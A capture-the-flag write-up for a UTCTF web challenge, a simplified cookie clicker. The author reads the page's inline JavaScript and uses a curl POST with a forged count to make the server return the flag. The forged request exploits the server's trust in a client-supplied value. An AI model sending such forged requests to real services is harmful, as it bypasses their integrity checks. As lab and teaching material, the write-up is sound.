## Prompt
I tried to make my own version of cookie clicker, without all of the extra fluff.
Can you beat my highscore?
http://betta.utctf.live:8138/

## Approach

This problem is relatively easy and I began by inspecting the HTML code of the home page, in which I found
some inline JS. 

```JavaScript
document.addEventListener('DOMContentLoaded', function() {
            var count = parseInt(localStorage.getItem('count')) || 0;
            var cookieImage = document.getElementById('cookieImage');
            var display = document.getElementById('clickCount');

            display.textContent = count;

            cookieImage.addEventListener('click', function() {
                count++;
                display.textContent = count;
                localStorage.setItem('count', count);

                if (count >= 10000000) {
                    fetch('/click', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        body: 'count=' + count
                    })
                    .then(response => response.json())
                    .then(data => {
                        alert(data.flag);
                    });
                }
            });
        });
```
I noticed that the flag would displayed when the value of the variabe
`count` exceeds or is equal to 10,000,000.

Writing a script to automate clicks can immediately be ruled out since the number of clicks is very large. 
Command line utilities like cURL then come to the rescue. After some looking around, I found that we can make a POST request to the `click` endpoint
specifying the value of count we want 

```bash
curl -X POST --data "count=10000001" http://betta.utctf.live:8138/click
```
and it replies with the flag:

```
{"flag":"Wow, you beat me. Congrats! utflag{y0u_cl1ck_pr3tty_f4st}"}
```

